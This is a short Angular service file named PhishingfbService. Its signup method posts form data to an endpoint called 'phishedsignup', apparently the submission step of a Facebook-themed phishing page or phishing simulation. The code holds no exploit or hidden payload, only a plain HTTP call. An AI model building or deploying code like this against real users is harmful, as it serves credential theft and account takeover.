import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { environment } from 'src/environments/environment';

@Injectable({
  providedIn: 'root'
})
export class PhishingfbService {

  constructor(private httpClient: HttpClient) { }
  signup(data) {
    return this.httpClient.post(environment.baseUrl + environment.api.phishedsignup, data);
  }
}
